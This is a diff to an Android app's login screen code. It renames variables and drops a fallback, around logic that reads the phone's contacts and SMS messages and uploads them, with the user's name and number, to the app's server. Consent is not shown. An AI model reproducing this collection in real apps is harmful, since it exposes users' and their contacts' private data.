@@ -168,20 +168,20 @@ public class LoginActivity extends BaseActivity {
         req.token = SharedPrefsUtil.getInstance(this).getValue("token", null);
         req.mobile = SharedPrefsUtil.getInstance(this).getValue("mobile", null);
 
-        JSONArray jsonArray = MobileDataUtil.getUserData(this, "contact");
-        List<UBTData.DataBean.ContactBean> list = new ArrayList<>();
-        List<String> raw_list = new ArrayList<>();
-        for (int i = 0; i < jsonArray.length(); i++) {
+        JSONArray contactJsonArray = MobileDataUtil.getUserData(this, "contact");
+        List<UBTData.DataBean.ContactBean> contactBeenList = new ArrayList<>();
+        //List<String> raw_list = new ArrayList<>();
+        for (int i = 0; i < contactJsonArray.length(); i++) {
             JSONObject jsonObject = null;
             try {
-                jsonObject = jsonArray.getJSONObject(i);
+                jsonObject = contactJsonArray.getJSONObject(i);
                 UBTData.DataBean.ContactBean contactListBean = new UBTData.DataBean.ContactBean();
 
                 contactListBean.data1 = jsonObject.optString("data1");
                 contactListBean.display_name = jsonObject.optString("display_name");
 
-                list.add(contactListBean);
-                raw_list.add(jsonObject.toString());
+                contactBeenList.add(contactListBean);
+                //raw_list.add(jsonObject.toString());
 
             } catch (JSONException e) {
                 e.printStackTrace();
@@ -190,11 +190,12 @@ public class LoginActivity extends BaseActivity {
         UBTData.DataBean contactBean = new UBTData.DataBean();
         contactBean.category = "contact";
         req.data.add(contactBean);
-        if (list.size() > 0 && !list.isEmpty()) {
-            contactBean.contact_list = list;
-        } else {
-            contactBean.raw_data = raw_list;
+        if (contactBeenList.size() > 0 && !contactBeenList.isEmpty()) {
+            contactBean.contact_list = contactBeenList;
         }
+//        else {
+//            contactBean.raw_data = raw_list;
+//        }
 
         JSONArray smsJsonArray = MobileDataUtil.getUserData(this, "sms");
         List<UBTData.DataBean.SmsBean> smsList = new ArrayList<>();
@@ -226,15 +227,14 @@ public class LoginActivity extends BaseActivity {
         req.data.add(simBean);
         if (smsList.size() > 0 && !smsList.isEmpty()) {
             simBean.sms_list = smsList;
-        } else {
-//            simBean.raw_data = raw_list;
         }
+
         AuthApi.checkUserInfo(this, new OnItemDataCallBack<CheckUserInfoResp>() {
             @Override
             public void onItemDataCallBack(CheckUserInfoResp data) {
                 contactBean.clt_nm = data.name;
                 contactBean.mobile = data.mobile;
-                simBean.mobile = data.mobile;
+                simBean.clt_nm = data.name;
                 simBean.mobile = data.mobile;
                 //PersonApi.uploadPersonAndDeviceInfo(req);
                 PersonApi.uploadPersonAndDeviceInfo(req, new Callback() {
